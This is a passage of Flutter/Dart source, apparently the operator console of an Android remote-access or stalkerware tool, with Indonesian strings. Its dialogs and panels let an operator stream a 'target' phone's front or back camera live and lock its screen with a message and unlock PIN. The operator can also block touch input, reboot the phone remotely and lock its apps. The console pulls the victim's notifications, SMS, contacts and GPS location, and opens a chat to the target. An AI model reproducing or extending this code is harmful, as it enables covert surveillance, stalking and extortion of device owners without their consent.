                  child: SizedBox(
                    width: 16,
                    height: 16,
                    child: CircularProgressIndicator(
                      strokeWidth: 2,
                      color: Sk.redBright,
                    ),
                  ),
                ),
              _MetalIconButton(
                icon: Icons.refresh_rounded,
                onTap: () {
                  setState(() {});
                  _cmd('force_open', silent: true);
                },
              ),
              const SizedBox(width: 8),
              const _Screw(size: 12),
            ],
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // SECTION
  // ═══════════════════════════════════════════════════════════
  Widget _buildSection(String title, Color color, List<Widget> buttons) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 12, bottom: 8),
          child: Row(
            children: [
              _Led(color: color, size: 7),
              const SizedBox(width: 10),
              Text(
                title,
                style: TextStyle(
                  color: Sk.brass,
                  fontSize: 11,
                  fontWeight: FontWeight.w900,
                  fontFamily: 'Orbitron',
                  letterSpacing: 2,
                  shadows: const [
                    Shadow(
                      color: Colors.black,
                      offset: Offset(0, 1),
                      blurRadius: 2,
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: Container(
                  height: 1,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        color.withOpacity(0.5),
                        Colors.transparent,
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 8),
              const _Screw(size: 10),
            ],
          ),
        ),
        if (buttons.isNotEmpty)
          Wrap(
            spacing: 10,
            runSpacing: 10,
            children: buttons,
          ),
      ],
    );
  }

  // ═══════════════════════════════════════════════════════════
  // APPS PANEL
  // ═══════════════════════════════════════════════════════════
  Widget _buildAppsPanel() {
    if (_loadingApps) {
      return _SoftPanel(
        padding: const EdgeInsets.all(20),
        child: const Center(
          child: Column(
            children: [
              CircularProgressIndicator(
                  color: Sk.brass, strokeWidth: 2),
              SizedBox(height: 10),
              Text(
                'LOADING APPS...',
                style: TextStyle(
                  color: Sk.brass,
                  fontSize: 9,
                  fontFamily: 'Orbitron',
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
        ),
      );
    }

    if (_appList.isEmpty) return const SizedBox.shrink();

    final lockedCount =
        _appList.where((a) => a['locked'] == true).length;

    return Padding(
      padding: const EdgeInsets.only(top: 10),
      child: _SoftPanel(
        padding: const EdgeInsets.all(12),
        accent: Sk.redBright.withOpacity(0.5),
        child: Column(
          children: [
            Row(
              children: [
                const _Led(color: Sk.redBright, size: 7),
                const SizedBox(width: 8),
                const Icon(Icons.apps_rounded,
                    color: Sk.brass, size: 14),
                const SizedBox(width: 8),
                Text(
                  '${_appList.length} APPS',
                  style: const TextStyle(
                    color: Sk.brass,
                    fontSize: 10,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1.5,
                  ),
                ),
                const Spacer(),
                if (lockedCount > 0)
                  Container(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 8, vertical: 3),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(4),
                      color: Sk.redDeep,
                      border: Border.all(
                          color: Sk.redGlow.withOpacity(0.6), width: 1),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const _Led(color: Sk.redGlow, size: 4),
                        const SizedBox(width: 4),
                        Text(
                          '$lockedCount LOCKED',
                          style: const TextStyle(
                            color: Sk.redGlow,
                            fontSize: 7,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                  ),
                const SizedBox(width: 8),
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 6, vertical: 3),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(4),
                    color: Sk.brassDeep.withOpacity(0.4),
                    border: Border.all(
                        color: Sk.brass.withOpacity(0.6), width: 1),
                  ),
                  child: Text(
                    'PIN: $_adminPin',
                    style: const TextStyle(
                      color: Sk.brass,
                      fontSize: 7,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 10),
            ...List.generate(_appList.length, (i) {
              final app = _appList[i];
              final appName = app['name']?.toString() ?? 'Unknown';
              final pkg = app['package']?.toString() ?? '';
              final isLocked = app['locked'] == true;

              return _AppRow(
                appName: appName,
                package: pkg,
                isLocked: isLocked,
                onToggle: () =>
                    _showLockAppDialog(appName, pkg, isLocked),
              );
            }),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // CHAT PANEL
  // ═══════════════════════════════════════════════════════════
  Widget _buildChatPanel() {
    return Padding(
      padding: const EdgeInsets.only(top: 10),
      child: _SoftPanel(
        padding: const EdgeInsets.all(12),
        accent: Sk.purpleHi.withOpacity(0.5),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              height: 160,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(8),
                color: const Color(0xFF0F0D0B),
                border: Border.all(color: Sk.metalDark, width: 1.5),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.6),
                    offset: const Offset(0, 1),
                    blurRadius: 2,
                  ),
                ],
              ),
              child: _chat.isEmpty
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(Icons.chat_bubble_outline_rounded,
                              color: Sk.metalLight, size: 30),
                          const SizedBox(height: 8),
                          Text(
                            'NO MESSAGES YET',
                            style: TextStyle(
                              color: Sk.cream.withOpacity(0.4),
                              fontSize: 9,
                              fontFamily: 'Orbitron',
                              fontWeight: FontWeight.w900,
                              letterSpacing: 1.5,
                            ),
                          ),
                        ],
                      ),
                    )
                  : ListView.builder(
                      controller: _chatScroll,
                      padding: const EdgeInsets.all(10),
                      itemCount: _chat.length,
                      itemBuilder: (_, i) {
                        final m = _chat[i];
                        final isOwner = m['from'] == 'owner';
                        return Align(
                          alignment: isOwner
                              ? Alignment.centerRight
                              : Alignment.centerLeft,
                          child: Container(
                            margin:
                                const EdgeInsets.symmetric(vertical: 3),
                            padding: const EdgeInsets.symmetric(
                                horizontal: 10, vertical: 6),
                            constraints: BoxConstraints(
                              maxWidth: MediaQuery.of(context).size.width *
                                  0.55,
                            ),
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(10),
                              gradient: isOwner
                                  ? const LinearGradient(
                                      begin: Alignment.topLeft,
                                      end: Alignment.bottomRight,
                                      colors: [Sk.purpleHi, Sk.purple],
                                    )
                                  : null,
                              color: isOwner
                                  ? null
                                  : Colors.black.withOpacity(0.5),
                              border: isOwner
                                  ? Border.all(
                                      color: Sk.purpleHi.withOpacity(0.8),
                                      width: 1,
                                    )
                                  : Border.all(
                                      color: Sk.metalDark, width: 1),
                            ),
                            child: Column(
                              crossAxisAlignment: isOwner
                                  ? CrossAxisAlignment.end
                                  : CrossAxisAlignment.start,
                              children: [
                                Text(
                                  m['text'] ?? '',
                                  style: TextStyle(
                                    color: isOwner
                                        ? Colors.white
                                        : Sk.cream,
                                    fontSize: 10,
                                    fontFamily: 'ShareTechMono',
                                    fontWeight: FontWeight.w700,
                                  ),
                                ),
                                const SizedBox(height: 2),
                                Text(
                                  m['time'] ?? '',
                                  style: TextStyle(
                                    color: isOwner
                                        ? Colors.white.withOpacity(0.6)
                                        : Sk.cream.withOpacity(0.4),
                                    fontSize: 7,
                                    fontFamily: 'ShareTechMono',
                                  ),
                                ),
                              ],
                            ),
                          ),
                        );
                      },
                    ),
            ),
            const SizedBox(height: 10),
            Row(
              children: [
                Expanded(
                  child: _SoftInset(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    child: TextField(
                      controller: _chatCtrl,
                      style: const TextStyle(
                        color: Sk.cream,
                        fontSize: 11,
                        fontFamily: 'ShareTechMono',
                        fontWeight: FontWeight.w700,
                      ),
                      cursorColor: Sk.brass,
                      decoration: InputDecoration(
                        hintText: 'Type message to target...',
                        hintStyle: TextStyle(
                          color: Sk.cream.withOpacity(0.3),
                          fontSize: 10,
                          fontFamily: 'ShareTechMono',
                        ),
                        border: InputBorder.none,
                        contentPadding:
                            const EdgeInsets.symmetric(vertical: 12),
                      ),
                      onSubmitted: _sendChat,
                    ),
                  ),
                ),
                const SizedBox(width: 8),
                _SendButton(
                  onTap: () => _sendChat(_chatCtrl.text),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // LOG PANEL
  // ═══════════════════════════════════════════════════════════
  Widget _buildLogPanel() {
    if (_log.isEmpty) return const SizedBox.shrink();
    return Padding(
      padding: const EdgeInsets.only(top: 10),
      child: _SoftPanel(
        padding: const EdgeInsets.all(12),
        child: Container(
          height: 100,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(6),
            color: const Color(0xFF0A0806),
            border: Border.all(color: Sk.metalDark, width: 1),
          ),
          padding: const EdgeInsets.all(8),
          child: ListView.builder(
            itemCount: _log.length > 10 ? 10 : _log.length,
            itemBuilder: (_, i) => Padding(
              padding: const EdgeInsets.symmetric(vertical: 1),
              child: Text(
                _log[i],
                style: TextStyle(
                  color: Sk.cream.withOpacity(0.6),
                  fontSize: 8,
                  fontFamily: 'ShareTechMono',
                  fontWeight: FontWeight.w700,
                ),
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // DIALOGS
  // ═══════════════════════════════════════════════════════════
  void _showRestartDialog() {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.restart_alt_rounded,
        iconColor: Sk.amberHi,
        title: 'RESTART DEVICE',
        subtitle:
            'Target device will restart using PowerManager reflection.',
        child: const SizedBox.shrink(),
        actions: [
          _MetalButton(
            label: 'CANCEL',
            color: Sk.metalLight,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'RESTART',
            color: Sk.amberHi,
            height: 42,
            icon: Icons.restart_alt_rounded,
            onTap: () {
              Navigator.pop(context);
              _cmd('reboot_device');
            },
          ),
        ],
      ),
    );
  }

  void _showLiveDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      barrierColor: Colors.black.withOpacity(0.95),
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(10),
          child: _SoftPanel(
            padding: EdgeInsets.zero,
            accent: Sk.redBright,
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                // Header
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 14, vertical: 10),
                  decoration: const BoxDecoration(
                    color: Colors.black,
                    borderRadius:
                        BorderRadius.vertical(top: Radius.circular(9)),
                    border: Border(
                      bottom: BorderSide(color: Sk.redBright, width: 1.5),
                    ),
                  ),
                  child: Row(
                    children: [
                      const _Led(color: Sk.redGlow, size: 8),
                      const SizedBox(width: 8),
                      Text(
                        'LIVE — $_liveTitle',
                        style: const TextStyle(
                          color: Sk.brass,
                          fontSize: 11,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                      const Spacer(),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 8, vertical: 3),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(4),
                          color: Sk.greenDeep,
                          border: Border.all(
                              color: Sk.greenHi.withOpacity(0.6),
                              width: 1),
                        ),
                        child: Text(
                          '$_fps FPS',
                          style: const TextStyle(
                            color: Sk.greenGlow,
                            fontSize: 8,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            letterSpacing: 0.5,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                // Frame
                Container(
                  constraints: BoxConstraints(
                    maxHeight:
                        MediaQuery.of(context).size.height * 0.55,
                  ),
                  color: Colors.black,
                  child: _frame != null
                      ? Image.memory(
                          _frame!,
                          fit: BoxFit.contain,
                          gaplessPlayback: true,
                          filterQuality: FilterQuality.low,
                        )
                      : const SizedBox(
                          height: 180,
                          child: Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                CircularProgressIndicator(
                                  color: Sk.redBright,
                                  strokeWidth: 2,
                                ),
                                SizedBox(height: 10),
                                Text(
                                  'WAITING FOR FRAMES...',
                                  style: TextStyle(
                                    color: Sk.brass,
                                    fontSize: 9,
                                    fontFamily: 'Orbitron',
                                    fontWeight: FontWeight.w900,
                                    letterSpacing: 1.5,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                ),
                // Footer
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: const BoxDecoration(
                    color: Colors.black,
                    borderRadius:
                        BorderRadius.vertical(bottom: Radius.circular(9)),
                    border: Border(
                      top: BorderSide(color: Sk.redBright, width: 1.5),
                    ),
                  ),
                  child: Row(
                    children: [
                      Expanded(
                        child: _MetalButton(
                          label: 'SWITCH',
                          color: Sk.metalLight,
                          height: 40,
                          icon: Icons.cameraswitch_rounded,
                          onTap: () {
                            final isFront =
                                _liveTitle.contains('DEPAN');
                            _stopLive();
                            Future.delayed(
                                const Duration(milliseconds: 300),
                                () => _startLive('live_camera_start',
                                    isFront ? 'back' : 'front'));
                          },
                        ),
                      ),
                      const SizedBox(width: 8),
                      Expanded(
                        child: _MetalButton(
                          label: 'STOP',
                          color: Sk.redBright,
                          height: 40,
                          icon: Icons.stop_rounded,
                          onTap: () {
                            _stopLive();
                            Navigator.pop(ctx);
                          },
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.lock_rounded,
        iconColor: Sk.redBright,
        title: 'LOCK LIVE + CHAT',
        subtitle: 'Target locked + two-way chat',
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _SoftInset(
              child: TextField(
                controller: msgCtrl,
                style: const TextStyle(
                  color: Sk.cream,
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                ),
                cursorColor: Sk.brass,
                decoration: const InputDecoration(
                  hintText: 'Lock screen message',
                  hintStyle: TextStyle(color: Sk.metalLight, fontSize: 10),
                  border: InputBorder.none,
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
            const SizedBox(height: 10),
            _SoftInset(
              child: TextField(
                controller: pinCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(
                  color: Sk.cream,
                  fontSize: 14,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3,
                ),
                cursorColor: Sk.brass,
                decoration: const InputDecoration(
                  hintText: 'Unlock PIN (1234)',
                  hintStyle: TextStyle(color: Sk.metalLight, fontSize: 10),
                  border: InputBorder.none,
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
          ],
        ),
        actions: [
          _MetalButton(
            label: 'CANCEL',
            color: Sk.metalLight,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'LOCK LIVE',
            color: Sk.redBright,
            height: 42,
            icon: Icons.lock_rounded,
            onTap: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty
                  ? 'DEVICE LOCKED BY ADMINISTRATOR'
                  : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty
                  ? '1234'
                  : pinCtrl.text.trim();
              _cmd('lock_live', extra: '$msg|$pin');
            },
          ),
        ],
      ),
    );
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => _buildDialog(
          icon: Icons.camera_alt_rounded,
          iconColor: Sk.redBright,
          title: 'SELECT CAMERA',
          subtitle: 'Pilih kamera target',
          child: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: ['back', 'front'].map((v) {
              final isSel = sel == v;
              return GestureDetector(
                onTap: () => ss(() => sel = v),
                child: Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 20, vertical: 14),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    color: isSel
                        ? Sk.redBright.withOpacity(0.15)
                        : Sk.metalDark,
                    border: Border.all(
                      color: isSel ? Sk.redBright : Sk.metalLight,
                      width: isSel ? 1.5 : 1,
                    ),
                  ),
                  child: Column(
                    children: [
                      Icon(
                        v == 'back'
                            ? Icons.camera_rear_rounded
                            : Icons.camera_front_rounded,
                        color: isSel ? Sk.redBright : Sk.metalLight,
                        size: 26,
                      ),
                      const SizedBox(height: 6),
                      Text(
                        v == 'back' ? 'BACK' : 'FRONT',
                        style: TextStyle(
                          color: isSel ? Sk.redBright : Sk.metalLight,
                          fontSize: 9,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Orbitron',
                          letterSpacing: 1.2,
                        ),
                      ),
                    ],
                  ),
                ),
              );
            }).toList(),
          ),
          actions: [
            _MetalButton(
              label: 'CANCEL',
              color: Sk.metalLight,
              height: 42,
              onTap: () => Navigator.pop(ctx),
            ),
            _MetalButton(
              label: 'SELECT',
              color: Sk.redBright,
              height: 42,
              icon: Icons.check_rounded,
              onTap: () {
                Navigator.pop(ctx);
                onPick(sel);
              },
            ),
          ],
        ),
      ),
    );
  }

  void _inputDialog(String title, String label, Function(String) onDone,
      {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.edit_rounded,
        iconColor: Sk.redBright,
        title: title.toUpperCase(),
        subtitle: label,
        child: _SoftInset(
          child: TextField(
            controller: ctrl,
            keyboardType:
                isNumber ? TextInputType.number : TextInputType.text,
            style: const TextStyle(
              color: Sk.cream,
              fontSize: 12,
              fontFamily: 'ShareTechMono',
            ),
            cursorColor: Sk.brass,
            decoration: InputDecoration(
              hintText: hint,
              hintStyle:
                  const TextStyle(color: Sk.metalLight, fontSize: 10),
              border: InputBorder.none,
              contentPadding: const EdgeInsets.symmetric(vertical: 12),
            ),
          ),
        ),
        actions: [
          _MetalButton(
            label: 'CANCEL',
            color: Sk.metalLight,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'SEND',
            color: Sk.redBright,
            height: 42,
            icon: Icons.send_rounded,
            onTap: () {
              Navigator.pop(context);
              onDone(ctrl.text.trim());
            },
          ),
        ],
      ),
    );
  }

  void _showTouchBlockDialog() {
    final durationCtrl = TextEditingController(text: '5');
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.touch_app,
        iconColor: Sk.redBright,
        title: 'CUSTOM TOUCH BLOCK',
        subtitle: 'Block all touch input on target device',
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _SoftInset(
              child: TextField(
                controller: durationCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(
                  color: Sk.cream,
                  fontSize: 16,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 2,
                ),
                cursorColor: Sk.brass,
                decoration: const InputDecoration(
                  hintText: 'Duration (seconds)',
                  hintStyle: TextStyle(color: Sk.metalLight, fontSize: 10),
                  border: InputBorder.none,
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
            const SizedBox(height: 10),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(6),
                color: Sk.redDeep.withOpacity(0.4),
                border: Border.all(
                    color: Sk.redBright.withOpacity(0.4), width: 1),
              ),
              child: Row(
                children: [
                  const Icon(Icons.info_outline_rounded,
                      color: Sk.redBright, size: 12),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      'Touch will be disabled for the specified duration',
                      style: TextStyle(
                        color: Sk.cream.withOpacity(0.6),
                        fontSize: 8,
                        fontFamily: 'ShareTechMono',
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
        actions: [
          _MetalButton(
            label: 'CANCEL',
            color: Sk.metalLight,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'BLOCK',
            color: Sk.redBright,
            height: 42,
            icon: Icons.touch_app,
            onTap: () {
              Navigator.pop(context);
              final duration = durationCtrl.text.trim();
              if (duration.isEmpty || int.tryParse(duration) == null) {
                _toast('Please enter valid duration', c: Sk.amberHi);
                return;
              }
              final seconds = int.parse(duration);
              if (seconds <= 0 || seconds > 300) {
                _toast('Duration must be between 1-300 seconds',
                    c: Sk.amberHi);
                return;
              }
              _cmd('touch_block', extra: duration);
              _toast('Touch blocked for $duration seconds',
                  c: Sk.redBright);
            },
          ),
        ],
      ),
    );
  }

  void _showChangePinDialog() {
    final pinCtrl = TextEditingController();
    final confirmCtrl = TextEditingController();
    showDialog(
      context: context,
      barrierDismissible: false,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.security_rounded,
        iconColor: Sk.redBright,
        title: 'CHANGE ADMIN PIN',
        subtitle: 'PIN saat ini: $_adminPin',
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _SoftInset(
              child: TextField(
                controller: pinCtrl,
                keyboardType: TextInputType.number,
                obscureText: true,
                maxLength: 6,
                style: const TextStyle(
                  color: Sk.cream,
                  fontSize: 14,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3,
                ),
                cursorColor: Sk.brass,
                decoration: const InputDecoration(
                  hintText: 'PIN BARU (4-6 digit)',
                  hintStyle: TextStyle(color: Sk.metalLight, fontSize: 10),
                  border: InputBorder.none,
                  counterText: '',
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
            const SizedBox(height: 10),
            _SoftInset(
              child: TextField(
                controller: confirmCtrl,
                keyboardType: TextInputType.number,
                obscureText: true,
                maxLength: 6,
                style: const TextStyle(
                  color: Sk.cream,
                  fontSize: 14,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3,
                ),
                cursorColor: Sk.brass,
                decoration: const InputDecoration(
                  hintText: 'KONFIRMASI PIN',
                  hintStyle: TextStyle(color: Sk.metalLight, fontSize: 10),
                  border: InputBorder.none,
                  counterText: '',
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
          ],
        ),
        actions: [
          _MetalButton(
            label: 'BATAL',
            color: Sk.metalLight,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'UBAH',
            color: Sk.redBright,
            height: 42,
            icon: Icons.check_rounded,
            onTap: () {
              final pin = pinCtrl.text.trim();
              final confirm = confirmCtrl.text.trim();
              if (pin.isEmpty || pin.length < 4) {
                _toast('PIN minimal 4 digit', c: Sk.amberHi);
                return;
              }
              if (pin != confirm) {
                _toast('PIN tidak cocok!', c: Sk.redBright);
                return;
              }
              _adminPin = pin;
              Navigator.pop(context);
              _toast('PIN admin berhasil diubah', c: Sk.greenHi);
              setState(() {});
            },
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // DATA DISPLAY DIALOGS
  // ═══════════════════════════════════════════════════════════
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http
          .get(Uri.parse('$baseUrl/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        _showListSheet(
          'NOTIFICATIONS (${list.length})',
          list,
          Icons.notifications_rounded,
          (item) => {
            'title': item['title']?.toString() ?? '-',
            'subtitle': item['body']?.toString() ?? '',
          },
        );
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(
        context: context,
        barrierColor: Colors.black.withOpacity(0.9),
        builder: (_) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(12),
          child: _SoftPanel(
            padding: EdgeInsets.zero,
            accent: Sk.brass,
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: const BoxDecoration(
                    color: Colors.black,
                    borderRadius:
                        BorderRadius.vertical(top: Radius.circular(9)),
                    border: Border(
                      bottom: BorderSide(color: Sk.brass, width: 1),
                    ),
                  ),
                  child: Row(
                    children: [
                      const _Led(color: Sk.brass, size: 7),
                      const SizedBox(width: 10),
                      Text(
                        title.toUpperCase(),
                        style: const TextStyle(
                          color: Sk.brass,
                          fontSize: 12,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                    ],
                  ),
                ),
                ClipRRect(
                  borderRadius: const BorderRadius.vertical(
                      bottom: Radius.circular(9)),
                  child: Image.memory(bytes, fit: BoxFit.contain),
                ),
              ],
            ),
          ),
        ),
      );
    } catch (_) {
      _toast('Image decode failed');
    }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.my_location_rounded,
        iconColor: Sk.greenHi,
        title: 'GPS LOCATION',
        subtitle: 'Target coordinates',
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _SoftInset(
              padding: const EdgeInsets.all(12),
              child: Row(
                children: [
                  const Icon(Icons.location_on_rounded,
                      color: Sk.greenGlow, size: 14),
                  const SizedBox(width: 8),
                  Text(
                    'LAT: $lat',
                    style: const TextStyle(
                      color: Sk.greenGlow,
                      fontSize: 11,
                      fontFamily: 'ShareTechMono',
                      fontWeight: FontWeight.w700,
                      letterSpacing: 1,
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 8),
            _SoftInset(
              padding: const EdgeInsets.all(12),
              child: Row(
                children: [
                  const Icon(Icons.location_on_rounded,
                      color: Sk.greenGlow, size: 14),
                  const SizedBox(width: 8),
                  Text(
                    'LNG: $lng',
                    style: const TextStyle(
                      color: Sk.greenGlow,
                      fontSize: 11,
                      fontFamily: 'ShareTechMono',
                      fontWeight: FontWeight.w700,
                      letterSpacing: 1,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
        actions: [
          _MetalButton(
            label: 'CLOSE',
            color: Sk.metalLight,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'OPEN MAPS',
            color: Sk.greenHi,
            height: 42,
            icon: Icons.map_rounded,
            onTap: () => launchUrl(
              Uri.parse(
                  'https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
              mode: LaunchMode.externalApplication,
            ),
          ),
        ],
      ),
    );
  }

  void _textDialog(String title, String content) {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.text_snippet_rounded,
        iconColor: Sk.cyanHi,
        title: title.toUpperCase(),
        subtitle: 'Extracted data',
        child: Container(
          constraints: const BoxConstraints(maxHeight: 300),
          child: SingleChildScrollView(
            child: _SoftInset(
              padding: const EdgeInsets.all(12),
              child: SelectableText(
                content,
                style: const TextStyle(
                  color: Sk.cream,
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                  height: 1.5,
                ),
              ),
            ),
          ),
        ),
        actions: [
          _MetalButton(
            label: 'CLOSE',
            color: Sk.metalLight,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
        ],
      ),
    );
  }

  void _contactsSheet(List contacts) {
    _showListSheet(
      'CONTACTS (${contacts.length})',
      contacts,
      Icons.person_rounded,
      (c) => {
        'title': c['name']?.toString() ?? '-',
        'subtitle': c['number']?.toString() ?? '-',
      },
    );
  }

  void _smsSheet(List sms) {
    _showListSheet(
      'SMS (${sms.length})',
      sms,
      Icons.sms_rounded,
      (s) => {
        'title': s['address']?.toString() ?? '-',
        'subtitle': s['body']?.toString() ?? '',
      },
    );
  }

  void _showListSheet(
    String title,
    List items,
    IconData icon,
    Map<String, String> Function(dynamic) mapFn,
  ) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => Container(
        height: MediaQuery.of(context).size.height * 0.7,
        decoration: const BoxDecoration(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              Color(0xFF2A1F18),
              Color(0xFF1A1310),
              Color(0xFF0F0A08),
            ],
          ),
        ),
        child: SafeArea(
          top: false,
          child: Column(
            children: [
              Container(
                margin: const EdgeInsets.only(top: 10),
                width: 50,
                height: 4,
                decoration: BoxDecoration(
                  color: Sk.metalLight,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(14),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: Sk.redDeep,
                        border: Border.all(
                            color: Sk.redGlow.withOpacity(0.6), width: 1),
                      ),
                      child: Icon(icon, color: Sk.redGlow, size: 16),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        title,
                        style: const TextStyle(
                          color: Sk.brass,
                          fontSize: 12,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
